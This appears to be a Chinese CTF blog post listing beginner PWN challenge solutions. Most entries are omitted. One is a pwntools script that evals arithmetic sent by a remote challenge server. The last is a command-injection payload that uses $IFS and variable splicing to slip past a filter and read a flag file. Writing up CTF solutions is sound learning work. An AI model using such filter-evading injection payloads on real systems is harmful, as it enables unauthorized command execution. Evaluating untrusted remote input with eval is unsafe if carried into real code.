---
title: PWN入门-入门泛做题
date: 2024-02-13 18:36:44
tags: PWN
mathjax: true
---

# PWN入门-入门泛做题

## [LitCTF 2023]只需要nc一下~

Dockerfile

## [NISACTF 2022]ReorPwn?

略。

## [HNCTF 2022 Week1]easync

略。

## [SWPUCTF 2022 新生赛]Does your nc work？

略。

## [HGAME 2023 week1]test_nc

略。

## [GDOUCTF 2023]EASY PWN

应该是ret2text，但是题出的有问题...

## [LitCTF 2023]口算题卡

```python
from pwn import *
context(log_level='debug')
p=remote("node4.anna.nssctf.cn",28864)
for i in range(0,100):
    p.recvuntil("What is ")
    line_get=p.recvline().strip().strip(b'?').decode()
    ans=str(eval(line_get)).encode()
    p.sendline(ans)
p.interactive()
```

## [HUBUCTF 2022 新生赛]singout

```bash
a=g;tac$IFS$9fla$a.txt
```
